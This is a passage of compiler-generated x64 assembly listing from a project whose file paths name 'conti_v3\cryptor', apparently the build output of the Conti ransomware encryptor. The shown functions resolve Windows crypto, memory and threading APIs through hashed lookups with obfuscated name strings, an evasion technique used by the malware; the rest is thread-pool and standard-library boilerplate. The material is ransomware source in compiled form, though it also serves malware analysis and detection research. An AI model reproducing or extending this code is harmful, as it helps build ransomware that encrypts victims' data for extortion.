	00 00 00 00 00	 mov	 DWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+16, 0

; 114  : 	g_NetworkThreadPool.IsActive = FALSE;

  00047	c7 05 10 00 00
	00 00 00 00 00	 mov	 DWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+16, 0

; 115  : }

  00051	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?Initialize@threadpool@@YAXXZ ENDP			; threadpool::Initialize
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z
_TEXT	SEGMENT
pFunction$ = 8
phProv$ = 256
szContainer$ = 264
szProvider$ = 272
dwProvType$ = 280
dwFlags$ = 288
?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z PROC		; pCryptAcquireContextA, COMDAT

; 648  : {

$LN3:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 649  : 	BOOL(WINAPI * pFunction)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
; 650  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xad18087f, 52);//GetProcAddress(hAdvapi32, OBFA("CryptAcquireContextA"));

  0002e	41 b9 34 00 00
	00		 mov	 r9d, 52			; 00000034H
  00034	41 b8 7f 08 18
	ad		 mov	 r8d, -1390933889	; ad18087fH
  0003a	ba 10 00 00 00	 mov	 edx, 16
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 651  : 	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);

  0004a	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR dwFlags$[rbp]
  00050	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00054	44 8b 8d 18 01
	00 00		 mov	 r9d, DWORD PTR dwProvType$[rbp]
  0005b	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR szProvider$[rbp]
  00062	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR szContainer$[rbp]
  00069	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR phProv$[rbp]
  00070	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 652  : }

  00073	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0007a	5f		 pop	 rdi
  0007b	5d		 pop	 rbp
  0007c	c3		 ret	 0
?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z ENDP		; pCryptAcquireContextA
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z
_TEXT	SEGMENT
pFunction$ = 8
hProv$ = 256
pbData$ = 264
dwDataLen$ = 272
hPubKey$ = 280
dwFlags$ = 288
phKey$ = 296
?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z PROC		; pCryptImportKey, COMDAT

; 609  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 610  : 	BOOL(WINAPI * pFunction)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*);
; 611  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0x70d2c0e4, 55);//GetProcAddress(hAdvapi32, OBFA("CryptImportKey"));

  0002e	41 b9 37 00 00
	00		 mov	 r9d, 55			; 00000037H
  00034	41 b8 e4 c0 d2
	70		 mov	 r8d, 1892860132		; 70d2c0e4H
  0003a	ba 10 00 00 00	 mov	 edx, 16
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 612  : 	return pFunction(hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey);

  0004a	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR phKey$[rbp]
  00051	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  00056	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR dwFlags$[rbp]
  0005c	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00060	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR hPubKey$[rbp]
  00067	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR dwDataLen$[rbp]
  0006e	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR pbData$[rbp]
  00075	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hProv$[rbp]
  0007c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 613  : }

  0007f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00086	5f		 pop	 rdi
  00087	5d		 pop	 rbp
  00088	c3		 ret	 0
?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z ENDP		; pCryptImportKey
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z
_TEXT	SEGMENT
pFunction$ = 8
nCount$ = 256
lpHandles$ = 264
bWaitAll$ = 272
dwMilliseconds$ = 280
?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z PROC		; pWaitForMultipleObjects, COMDAT

; 575  : {

$LN3:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001c	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 576  : 	DWORD(WINAPI * pFunction)(DWORD, const HANDLE*, BOOL, DWORD);
; 577  : 	pFunction = (DWORD(WINAPI*)(DWORD, const HANDLE*, BOOL, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x78b61591, 58);//GetProcAddress(hKernel32, OBFA("WaitForMultipleObjects"));

  0002d	41 b9 3a 00 00
	00		 mov	 r9d, 58			; 0000003aH
  00033	41 b8 91 15 b6
	78		 mov	 r8d, 2025198993		; 78b61591H
  00039	ba 0f 00 00 00	 mov	 edx, 15
  0003e	33 c9		 xor	 ecx, ecx
  00040	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00045	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 578  : 	return pFunction(nCount, lpHandles, bWaitAll, dwMilliseconds);

  00049	44 8b 8d 18 01
	00 00		 mov	 r9d, DWORD PTR dwMilliseconds$[rbp]
  00050	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR bWaitAll$[rbp]
  00057	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpHandles$[rbp]
  0005e	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR nCount$[rbp]
  00064	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 579  : }

  00067	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0006e	5f		 pop	 rdi
  0006f	5d		 pop	 rbp
  00070	c3		 ret	 0
?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z ENDP		; pWaitForMultipleObjects
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pVirtualAlloc@@YAPEAXPEAX_KKK@Z
_TEXT	SEGMENT
pFunction$ = 8
lpAddress$ = 256
dwSize$ = 264
flAllocationType$ = 272
flProtect$ = 280
?pVirtualAlloc@@YAPEAXPEAX_KKK@Z PROC			; pVirtualAlloc, COMDAT

; 563  : {

$LN3:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 564  : 	LPVOID(WINAPI * pFunction)(LPVOID, SIZE_T, DWORD, DWORD);
; 565  : 	pFunction = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1aab6455, 59);//GetProcAddress(hKernel32, OBFA("VirtualAlloc"));

  0002e	41 b9 3b 00 00
	00		 mov	 r9d, 59			; 0000003bH
  00034	41 b8 55 64 ab
	1a		 mov	 r8d, 447439957		; 1aab6455H
  0003a	ba 0f 00 00 00	 mov	 edx, 15
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 566  : 	return pFunction(lpAddress, dwSize, flAllocationType, flProtect);

  0004a	44 8b 8d 18 01
	00 00		 mov	 r9d, DWORD PTR flProtect$[rbp]
  00051	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR flAllocationType$[rbp]
  00058	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR dwSize$[rbp]
  0005f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpAddress$[rbp]
  00066	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 567  : }

  00069	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00070	5f		 pop	 rdi
  00071	5d		 pop	 rbp
  00072	c3		 ret	 0
?pVirtualAlloc@@YAPEAXPEAX_KKK@Z ENDP			; pVirtualAlloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pSleep@@YAXK@Z
_TEXT	SEGMENT
pFunction$ = 8
dwMilliseconds$ = 256
?pSleep@@YAXK@Z PROC					; pSleep, COMDAT

; 465  : {

$LN3:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 466  : 	void(WINAPI * pFunction)(DWORD);
; 467  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb09422e9, 69);//GetProcAddress(hKernel32, OBFA("Sleep"));

  0001e	41 b9 45 00 00
	00		 mov	 r9d, 69			; 00000045H
  00024	41 b8 e9 22 94
	b0		 mov	 r8d, -1332469015	; b09422e9H
  0002a	ba 0f 00 00 00	 mov	 edx, 15
  0002f	33 c9		 xor	 ecx, ecx
  00031	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00036	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 468  : 	return pFunction(dwMilliseconds);

  0003a	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR dwMilliseconds$[rbp]
  00040	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 469  : }

  00043	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
?pSleep@@YAXK@Z ENDP					; pSleep
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pExitThread@@YAXK@Z
_TEXT	SEGMENT
pFunction$ = 8
dwExitCode$ = 256
?pExitThread@@YAXK@Z PROC				; pExitThread, COMDAT

; 443  : {

$LN3:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 444  : 	void(WINAPI * pFunction)(DWORD);
; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  0001e	41 b9 47 00 00
	00		 mov	 r9d, 71			; 00000047H
  00024	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  0002a	ba 0f 00 00 00	 mov	 edx, 15
  0002f	33 c9		 xor	 ecx, ecx
  00031	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00036	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 446  : 	return pFunction(dwExitCode);

  0003a	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR dwExitCode$[rbp]
  00040	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 447  : }

  00043	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
?pExitThread@@YAXK@Z ENDP				; pExitThread
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpCriticalSection$ = 256
?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pInitializeCriticalSection, COMDAT

; 421  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 422  : 	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  0001f	41 b9 49 00 00
	00		 mov	 r9d, 73			; 00000049H
  00025	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 424  : 	return pFunction(lpCriticalSection);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpCriticalSection$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 425  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pInitializeCriticalSection
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpCriticalSection$ = 256
?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pLeaveCriticalSection, COMDAT

; 412  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 413  : 	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  0001f	41 b9 4a 00 00
	00		 mov	 r9d, 74			; 0000004aH
  00025	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 415  : 	return pFunction(lpCriticalSection);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpCriticalSection$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 416  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pLeaveCriticalSection
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpCriticalSection$ = 256
?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pEnterCriticalSection, COMDAT

; 394  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 395  : 	VOID(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  0001f	41 b9 4c 00 00
	00		 mov	 r9d, 76			; 0000004cH
  00025	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 397  : 	return pFunction(lpCriticalSection);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpCriticalSection$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 398  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pEnterCriticalSection
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z
_TEXT	SEGMENT
pFunction$ = 8
lpThreadAttributes$ = 256
dwStackSize$ = 264
lpStartAddress$ = 272
lpParameter$ = 280
dwCreationFlags$ = 288
lpThreadId$ = 296
?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z PROC ; pCreateThread, COMDAT

; 331  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 332  : 	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  0002e	41 b9 52 00 00
	00		 mov	 r9d, 82			; 00000052H
  00034	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  0003a	ba 0f 00 00 00	 mov	 edx, 15
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  0004a	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR lpThreadId$[rbp]
  00051	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  00056	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR dwCreationFlags$[rbp]
  0005c	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00060	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR lpParameter$[rbp]
  00067	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR lpStartAddress$[rbp]
  0006e	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR dwStackSize$[rbp]
  00075	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpThreadAttributes$[rbp]
  0007c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 335  : }

  0007f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00086	5f		 pop	 rdi
  00087	5d		 pop	 rbp
  00088	c3		 ret	 0
?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z ENDP ; pCreateThread
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1534 :     constexpr const _Ty1& _Get_first() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
